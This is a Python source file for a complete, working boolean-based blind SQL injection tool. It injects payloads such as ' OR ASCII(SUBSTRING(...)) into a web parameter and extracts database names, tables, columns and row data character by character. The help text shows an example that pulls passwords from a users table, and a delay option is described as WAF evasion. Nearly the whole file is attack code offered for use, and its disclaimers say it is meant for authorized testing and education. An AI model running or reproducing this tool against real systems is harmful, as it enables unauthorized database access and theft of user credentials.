#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║       Boolean-Based Blind SQL Injection Toolkit v1.0         ║
║                         blind-sqli                           ║
╚══════════════════════════════════════════════════════════════╝

Developed by Toxpox (github.com/Toxpox)

This tool is built strictly for educational purposes and
authorized penetration testing. Please don't be that guy
who uses it on systems without permission — it's illegal
and you'll ruin it for everyone.
"""

import requests
import sys
import time
import argparse
import json
import os
import re
import logging
from datetime import datetime
from dataclasses import dataclass, field
from typing import Optional

# rich makes the terminal look cool, but if it's missing I just use print
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import (
        Progress, SpinnerColumn, BarColumn, TextColumn,
        TimeElapsedColumn, TimeRemainingColumn, TaskProgressColumn
    )
    from rich.live import Live
    from rich.text import Text
    from rich.align import Align
    from rich.columns import Columns
    from rich.rule import Rule
    from rich.style import Style
    from rich.traceback import install as install_rich_traceback
    from rich.logging import RichHandler
    from rich.markup import escape

    install_rich_traceback(show_locals=False)
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False

console = Console() if RICH_AVAILABLE else None

# logging setup — rich handler if available, basic format otherwise
if RICH_AVAILABLE:
    logging.basicConfig(
        level=logging.WARNING,
        format="%(message)s",
        handlers=[RichHandler(console=console, show_path=False, markup=True)],
    )
else:
    logging.basicConfig(
        level=logging.WARNING,
        format="[%(levelname)s] %(message)s",
    )

logger = logging.getLogger("blind_sqli")


# made these so I stop using sys.exit() everywhere like a maniac
class LengthNotFoundError(Exception):
    """couldn't find the string length — probably bad url or true-string"""
    pass


class ExtractionError(Exception):
    """something broke during char-by-char extraction"""
    pass


# shoved all config into a dataclass so I don't pass args everywhere
@dataclass
class Config:
    url: str
    method: str = "POST"
    param: str = "search"
    true_string: str = ""
    cookie: Optional[str] = None
    extra_headers: Optional[list] = None
    delay: float = 0.0
    timeout: int = 10
    no_verify: bool = False
    extract: str = "database"
    table: Optional[str] = None
    column: Optional[str] = None
    query: Optional[str] = None
    output: Optional[str] = None
    max_retries: int = 3
    verbose: bool = False

    @classmethod
    def from_args(cls, args: argparse.Namespace) -> "Config":
        return cls(
            url=args.url,
            method=args.method.upper(),
            param=args.param,
            true_string=args.true_string,
            cookie=args.cookie,
            extra_headers=args.header,
            delay=args.delay,
            timeout=args.timeout,
            no_verify=args.no_verify,
            extract=args.extract,
            table=args.table,
            column=args.column,
            query=args.query,
            output=args.output,
            max_retries=args.retries,
            verbose=args.verbose,
        )


# payload templates — I format these with the actual values later
PAYLOADS = {
    "length": "' OR LENGTH(({query}))={length} -- -",
    "char": "' OR ASCII(SUBSTRING(({query}),{pos},1))={char} -- -",
}

# the actual SQL subqueries I inject, standard information_schema stuff
QUERIES = {
    "database": "SELECT DATABASE()",
    "user": "SELECT CURRENT_USER()",
    "version": "SELECT VERSION()",
    "tables": (
        "SELECT table_name FROM information_schema.tables "
        "WHERE table_schema=DATABASE() LIMIT 1 OFFSET {offset}"
    ),
    "columns": (
        "SELECT column_name FROM information_schema.columns "
        "WHERE table_name='{table}' LIMIT 1 OFFSET {offset}"
    ),
    "data": "SELECT {column} FROM {table} LIMIT 1 OFFSET {offset}",
}

# just tracking request count and timing for the stats at the end
stats = {"requests": 0, "start_time": None}


# ═══════════════════════════════════
# banner + ui stuff
# ═══════════════════════════════════


CYBER_BANNER = """
    +-------------------------------------------------------------+
    |  .█▀▀.█▀█.█░░░░░█▀▀.█░█.▀█▀.█▀▄.█▀█.█▀▀.▀█▀.█▀█.█▀▄         |
    |  .▀▀█.█░█.█░░░░░█▀▀.▄▀▄.░█░.█▀▄.█▀█.█░░░░█░.█░█.█▀▄         |
    |  .▀▀▀.▀▀▀.▀▀▀░░░▀▀▀.▀░▀.░▀░.▀░▀.▀░▀.▀▀▀░░▀░.▀▀▀.▀░▀         |
    |                                                             |
    |     [*] Boolean-Based Blind SQL Injection Toolkit [*]       |
    |                        v1.0                                 |
    +-------------------------------------------------------------+
"""


def print_banner():
    if RICH_AVAILABLE:
        banner_text = Text(CYBER_BANNER, style="bold green")
        disclaimer = Text(
            "    ⚠  FOR AUTHORIZED TESTING & EDUCATION ONLY  ⚠",
            style="bold red"
        )
        console.print(banner_text)
        console.print(disclaimer)
        console.print(
            Rule(
                title="[bold cyan]>> INITIALIZING ATTACK VECTOR <<[/]",
                style="bright_green",
            )
        )
    else:
        print(CYBER_BANNER)
        print("    [!] FOR AUTHORIZED TESTING & EDUCATION ONLY [!]\n")


def print_config(config: Config):
    """dump current config to screen so I know what I'm running with"""
    if RICH_AVAILABLE:
        table = Table(show_header=False, box=None, padding=(0, 2))
        table.add_column("Key", style="bright_cyan", width=16)
        table.add_column("Value", style="bright_white")

        table.add_row("🎯 Target", config.url)
        table.add_row("📡 Method", config.method)
        table.add_row("💉 Parameter", config.param)
        table.add_row("✅ True String", f"'{config.true_string}'")
        table.add_row("🔍 Extract", config.extract)
        table.add_row("🔁 Retries", str(config.max_retries))
        if config.delay:
            table.add_row("⏱️  Delay", f"{config.delay}s")
        if config.cookie:
            table.add_row("🍪 Cookie", config.cookie[:40] + "..." if len(config.cookie) > 40 else config.cookie)

        console.print(Panel(
            table,
            title="[bold bright_green]⚙ ATTACK CONFIGURATION[/]",
            border_style="bright_green",
            padding=(1, 2),
        ))
    else:
        print(f"[i] Target      : {config.url}")
        print(f"[i] Method      : {config.method}")
        print(f"[i] Parameter   : {config.param}")
        print(f"[i] True string : '{config.true_string}'")
        print(f"[i] Extract     : {config.extract}")


# ═══════════════════════════════════
# http stuff
# ═══════════════════════════════════

def build_session(config: Config) -> requests.Session:
    """session = reused connections, way faster than opening new ones"""
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
    })

    if config.cookie:
        session.headers["Cookie"] = config.cookie

    if config.extra_headers:
        for h in config.extra_headers:
            key, _, val = h.partition(":")
            session.headers[key.strip()] = val.strip()

    if config.no_verify:
        session.verify = False
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    return session


def send_request(
    session: requests.Session, url: str, payload: str, config: Config
) -> requests.Response:
    """
    sends the request with my payload. retries with backoff
    if connection drops — used to just sys.exit here, bad idea.
    """
    for attempt in range(config.max_retries):
        try:
            if config.method == "GET":
                res = session.get(
                    url,
                    params={config.param: payload},
                    timeout=config.timeout,
                )
            else:
                res = session.post(
                    url,
                    data={config.param: payload},
                    timeout=config.timeout,
                )

            stats["requests"] += 1
            return res

        except requests.exceptions.ConnectionError:
            wait = 2 ** attempt
            logger.warning(
                f"Connection refused (attempt {attempt + 1}/{config.max_retries}). "
                f"Retrying in {wait}s..."
            )
            if attempt == config.max_retries - 1:
                _fatal("[!] Connection refused after max retries. Target down?")
            time.sleep(wait)

        except requests.exceptions.Timeout:
            wait = 2 ** attempt
            logger.warning(
                f"Timeout (attempt {attempt + 1}/{config.max_retries}). "
                f"Retrying in {wait}s..."
            )
            if attempt == config.max_retries - 1:
                _fatal(f"[!] Request timed out after {config.max_retries} attempts.")
            time.sleep(wait)

        except requests.exceptions.RequestException as e:
            _fatal(f"[!] Request error: {e}")

    # shouldn't reach here but who knows
    _fatal("[!] Unexpected error in send_request loop.")


def is_true(
    session: requests.Session, url: str, payload: str, config: Config
) -> bool:
    """does the response contain my true-string? if yes, injection condition was true"""
    if config.delay:
        time.sleep(config.delay)

    res = send_request(session, url, payload, config)
    return config.true_string.lower() in res.text.lower()


# ═══════════════════════════════════
# extraction engine — the main logic
# ═══════════════════════════════════

def get_string_length(
    session: requests.Session, url: str, query: str, config: Config
) -> int:
    """
    find the length first before extracting chars.
    I check 16, 32, 64... to narrow down the range instead of
    always binary searching up to 512 — saves a ton of requests.
    """
    if RICH_AVAILABLE:
        console.print(
            f"  [bright_cyan]🔎 Detecting length:[/] [dim]{escape(query)}[/]"
        )
    else:
        print(f"\n[*] Detecting length of: {query}")

    # narrow down the upper bound first
    high = 0
    for max_len in [16, 32, 64, 128, 256, 512]:
        payload = f"' OR LENGTH(({query}))<={max_len} -- -"
        if is_true(session, url, payload, config):
            high = max_len
            break
    else:
        high = 512  # fine, it's huge, just cap at 512

    low = 1
    while low <= high:
        mid = (low + high) // 2

        if RICH_AVAILABLE:
            console.print(
                f"\r  [yellow]  ⟫ testing length ≈ {mid}[/]  ",
                end="",
            )
        else:
            sys.stdout.write(f"\r[~] Testing length = {mid}  ")
            sys.stdout.flush()

        payload_eq = PAYLOADS["length"].format(query=query, length=mid)
        if is_true(session, url, payload_eq, config):
            if RICH_AVAILABLE:
                console.print(
                    f"\r  [bold bright_green]  ✓ Length = {mid}[/]           "
                )
            else:
                print(f"\n[+] Length = {mid}")
            return mid

        payload_lt = f"' OR LENGTH(({query}))<{mid} -- -"
        if is_true(session, url, payload_lt, config):
            high = mid - 1
        else:
            low = mid + 1

    raise LengthNotFoundError(
        f"Could not determine length for query: {query}"
    )


def extract_string(
    session: requests.Session,
    url: str,
    query: str,
    length: int,
    config: Config,
    label: str = "value",
) -> str:
    """
    char by char extraction with binary search on ASCII values.
    ~7 requests per char vs ~95 brute force. I append to a list
    and join at the end instead of += on strings.
    """
    chars: list[str] = []

    if RICH_AVAILABLE:
        with Progress(
            SpinnerColumn("dots12", style="bright_green"),
            TextColumn("[bright_cyan]{task.description}[/]"),
            BarColumn(bar_width=30, style="bright_black", complete_style="bright_green", finished_style="bold green"),
            TaskProgressColumn(),
            TextColumn("[bright_yellow]{task.fields[current]}[/]"),
            TimeElapsedColumn(),
            console=console,
            transient=True,
        ) as progress:
            task = progress.add_task(
                f"Extracting {label}", total=length, current=""
            )

            for pos in range(1, length + 1):
                low, high = 32, 126  # printable ASCII range

                while low <= high:
                    mid = (low + high) // 2
                    progress.update(
                        task, current=f"{''.join(chars)}{chr(mid)}"
                    )

                    payload = PAYLOADS["char"].format(
                        query=query, pos=pos, char=mid
                    )
                    if is_true(session, url, payload, config):
                        chars.append(chr(mid))
                        progress.update(task, advance=1)
                        break

                    payload_lt = (
                        f"' OR ASCII(SUBSTRING(({query}),{pos},1))<{mid} -- -"
                    )
                    if is_true(session, url, payload_lt, config):
                        high = mid - 1
                    else:
                        low = mid + 1
                else:
                    chars.append("?")
                    progress.update(task, advance=1)

        result = "".join(chars)
        console.print(
            f"  [bold bright_green]  ✓ Extracted:[/] [bold white]{escape(result)}[/]"
        )
    else:
        for pos in range(1, length + 1):
            low, high = 32, 126

            while low <= high:
                mid = (low + high) // 2
                sys.stdout.write(
                    f"\r[>] [{pos}/{length}] {''.join(chars)}{chr(mid)}   "
                )
                sys.stdout.flush()

                payload = PAYLOADS["char"].format(
                    query=query, pos=pos, char=mid
                )
                if is_true(session, url, payload, config):
                    chars.append(chr(mid))
                    break

                payload_lt = (
                    f"' OR ASCII(SUBSTRING(({query}),{pos},1))<{mid} -- -"
                )
                if is_true(session, url, payload_lt, config):
                    high = mid - 1
                else:
                    low = mid + 1
            else:
                chars.append("?")

        result = "".join(chars)
        print(f"\n[+] Extracted: {result}")

    return result


def extract_list(
    session: requests.Session,
    url: str,
    query_template: str,
    config: Config,
    fmt_kwargs: Optional[dict] = None,  # don't use {} here, mutable default trap
) -> list:
    """
    loops through OFFSET 0, 1, 2... until nothing comes back.
    I use this for tables, columns, data rows — anything with multiple results.
    """
    if fmt_kwargs is None:
        fmt_kwargs = {}

    items: list[str] = []
    offset = 0

    while True:
        query = query_template.format(offset=offset, **fmt_kwargs)

        try:
            length = get_string_length(session, url, query, config)
        except LengthNotFoundError:
            break  # nothing left

        value = extract_string(
            session, url, query, length, config, label=f"row[{offset}]"
        )
        if not value or value.strip() == "?":
            break

        items.append(value)

        if RICH_AVAILABLE:
            console.print(
                f"  [bright_green]  📦 [{offset}][/] [bold]{escape(value)}[/]"
            )
        else:
            print(f"    [{offset}] {value}")

        offset += 1

    return items


# ═══════════════════════════════════
# input validation
# ═══════════════════════════════════

_SAFE_IDENTIFIER = re.compile(r"^[a-zA-Z0-9_]+$")


def validate_identifier(value: str, name: str):
    """only allow safe chars in identifiers so my own tool doesn't get injected lol"""
    if not _SAFE_IDENTIFIER.match(value):
        _fatal(
            f"[!] Invalid {name}: '{value}'. "
            f"Only alphanumeric characters and underscores are allowed."
        )


# ═══════════════════════════════════
# output
# ═══════════════════════════════════

def save_results(data: dict, output_path: str):
    """save to json. utf-8 encoding because windows kept breaking my output"""
    os.makedirs(
        os.path.dirname(output_path) if os.path.dirname(output_path) else ".",
        exist_ok=True,
    )
    with open(output_path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

    if RICH_AVAILABLE:
        console.print(
            f"\n  [bold bright_green]💾 Results saved → [underline]{output_path}[/][/]"
        )
    else:
        print(f"\n[+] Results saved → {output_path}")


def print_results(data: dict):
    """print everything I extracted, uses rich tables if available"""
    elapsed = time.time() - stats["start_time"] if stats["start_time"] else 0

    if RICH_AVAILABLE:
        console.print()
        console.print(
            Rule(title="[bold bright_green]✅ EXTRACTION COMPLETE[/]", style="bright_green")
        )

        # stats
        stats_table = Table(show_header=False, box=None, padding=(0, 3))
        stats_table.add_column(style="bright_cyan")
        stats_table.add_column(style="bright_white")
        stats_table.add_row("⏱️  Elapsed", f"{elapsed:.1f}s")
        stats_table.add_row("📡 Requests", str(stats["requests"]))
        stats_table.add_row(
            "🕐 Timestamp", datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        )
        console.print(
            Panel(stats_table, border_style="bright_black", title="[dim]Statistics[/]")
        )

        # actual results
        result_table = Table(
            title="[bold bright_green]🗃️  EXTRACTED DATA[/]",
            show_lines=True,
            border_style="bright_green",
            header_style="bold bright_cyan",
            title_style="bold",
        )
        result_table.add_column("Key", style="bright_cyan", width=20)
        result_table.add_column("Value", style="bright_white")

        for key, val in data.items():
            if isinstance(val, list):
                formatted = "\n".join(
                    f"[bright_yellow][{i}][/] {escape(item)}"
                    for i, item in enumerate(val)
                )
                result_table.add_row(key, formatted)
            else:
                result_table.add_row(key, escape(str(val)))

        console.print(result_table)
        console.print()
    else:
        print(f"\n{'=' * 56}")
        print(f"  EXTRACTION COMPLETE  -  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"  Requests: {stats['requests']}  |  Elapsed: {elapsed:.1f}s")
        print(f"{'=' * 56}")
        for key, val in data.items():
            if isinstance(val, list):
                print(f"  {key}:")
                for i, item in enumerate(val):
                    print(f"      [{i}] {item}")
            else:
                print(f"  {key}: {val}")
        print(f"{'=' * 56}\n")


# ═══════════════════════════════════
# helpers
# ═══════════════════════════════════

def _fatal(message: str):
    """print error, exit. simple."""
    if RICH_AVAILABLE:
        console.print(f"\n  [bold red]{message}[/]\n")
    else:
        print(f"\n{message}\n")
    sys.exit(1)


# ═══════════════════════════════════
# argparse setup
# ═══════════════════════════════════

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="blind_sqli_extractor",
        description=(
            "[*] Boolean-Based Blind SQL Injection Toolkit v1.0\n"
            "    Developed by Toxpox — Educational Use Only"
        ),
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=(
            "Examples:\n"
            '  %(prog)s -u http://target/search -t "in stock"\n'
            '  %(prog)s -u http://target/search -t "Welcome" --extract tables\n'
            '  %(prog)s -u http://target/search -t "true" --extract data '
            "--table users --column password\n"
        ),
    )

    # target info
    target = p.add_argument_group("[>] Target")
    target.add_argument("-u", "--url", required=True, help="Target URL")
    target.add_argument(
        "-m", "--method", default="POST", choices=["GET", "POST"],
        help="HTTP method (default: POST)",
    )
    target.add_argument(
        "-p", "--param", default="search",
        help="Vulnerable parameter name (default: search)",
    )
    target.add_argument(
        "-t", "--true-string", required=True, dest="true_string",
        help=(
            "String in response indicating TRUE condition\n"
            "e.g. 'in stock', 'Welcome', 'true'"
        ),
    )

    # auth stuff
    auth = p.add_argument_group("[>] Auth & Headers")
    auth.add_argument(
        "-c", "--cookie",
        help="Cookie header value (e.g. 'session=abc123')",
    )
    auth.add_argument(
        "-H", "--header", action="append", metavar="Name: Value",
        help="Extra header (repeatable, e.g. -H 'X-Forwarded-For: 127.0.0.1')",
    )

    # what to extract
    mode = p.add_argument_group("[>] Extraction Mode")
    mode.add_argument(
        "--extract", default="database",
        choices=["database", "user", "version", "tables", "columns", "data", "custom"],
        help="What to extract (default: database)",
    )
    mode.add_argument(
        "--table", help="Table name (required for --extract columns/data)"
    )
    mode.add_argument(
        "--column", help="Column name (required for --extract data)"
    )
    mode.add_argument(
        "--query",
        help='Raw SQL sub-query for --extract custom\ne.g. "SELECT secret FROM users LIMIT 1"',
    )

    # tuning
    tuning = p.add_argument_group("[>] Tuning")
    tuning.add_argument(
        "--delay", type=float, default=0,
        help="Seconds between requests (WAF evasion, default: 0)",
    )
    tuning.add_argument(
        "--timeout", type=int, default=10,
        help="Request timeout in seconds (default: 10)",
    )
    tuning.add_argument(
        "--retries", type=int, default=3,
        help="Max retries on connection failure (default: 3)",
    )
    tuning.add_argument(
        "--no-verify", action="store_true",
        help="Disable TLS certificate verification",
    )

    # output options
    out = p.add_argument_group("[>] Output")
    out.add_argument(
        "-o", "--output",
        help="Save results to JSON file (e.g. results.json)",
    )
    out.add_argument(
        "-v", "--verbose", action="store_true",
        help="Enable verbose/debug logging",
    )

    return p


# ═══════════════════════════════════
# main
# ═══════════════════════════════════

def main():
    parser = build_parser()
    args = parser.parse_args()
    config = Config.from_args(args)

    # verbose = show me everything
    if config.verbose:
        logger.setLevel(logging.DEBUG)

    # banner + config display
    print_banner()
    print_config(config)

    # http session
    session = build_session(config)

    # timer start
    stats["start_time"] = time.time()
    stats["requests"] = 0

    results = {
        "target": config.url,
        "timestamp": datetime.now().isoformat(),
        "extracted": {},
    }

    # route to the right extraction mode
    mode = config.extract

    try:
        if mode in ("database", "user", "version"):
            query = QUERIES[mode]
            length = get_string_length(session, config.url, query, config)
            value = extract_string(
                session, config.url, query, length, config, label=mode
            )
            results["extracted"][mode] = value

        elif mode == "tables":
            tables = extract_list(session, config.url, QUERIES["tables"], config)
            results["extracted"]["tables"] = tables

        elif mode == "columns":
            if not config.table:
                parser.error("--extract columns requires --table <name>")
            validate_identifier(config.table, "table name")
            cols = extract_list(
                session,
                config.url,
                QUERIES["columns"],
                config,
                fmt_kwargs={"table": config.table},
            )
            results["extracted"]["columns"] = cols

        elif mode == "data":
            if not config.table or not config.column:
                parser.error("--extract data requires both --table and --column")
            validate_identifier(config.table, "table name")
            validate_identifier(config.column, "column name")

            # build query but keep {offset} for the loop
            query_tmpl = (
                f"SELECT {config.column} FROM {config.table} "
                "LIMIT 1 OFFSET {offset}"
            )
            rows = extract_list(session, config.url, query_tmpl, config)
            results["extracted"]["data"] = rows

        elif mode == "custom":
            if not config.query:
                parser.error("--extract custom requires --query '<SQL>'")
            query = config.query
            length = get_string_length(session, config.url, query, config)
            value = extract_string(
                session, config.url, query, length, config, label="custom"
            )
            results["extracted"]["custom"] = value

    except LengthNotFoundError as e:
        _fatal(f"[!] {e}")
    except ExtractionError as e:
        _fatal(f"[!] {e}")

    # done, show results
    print_results(results["extracted"])

    if config.output:
        save_results(results, config.output)

    # footer
    if RICH_AVAILABLE:
        console.print(
            Panel(
                "[bold bright_green]Session complete. Stay ethical. 🛡️[/]",
                border_style="bright_green",
            )
        )


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        if RICH_AVAILABLE:
            console.print(
                "\n\n  [bold red]⚠ Interrupted by user. Exiting cleanly.[/]\n"
            )
        else:
            print("\n\n[!] Interrupted by user. Exiting cleanly.\n")
        sys.exit(0)
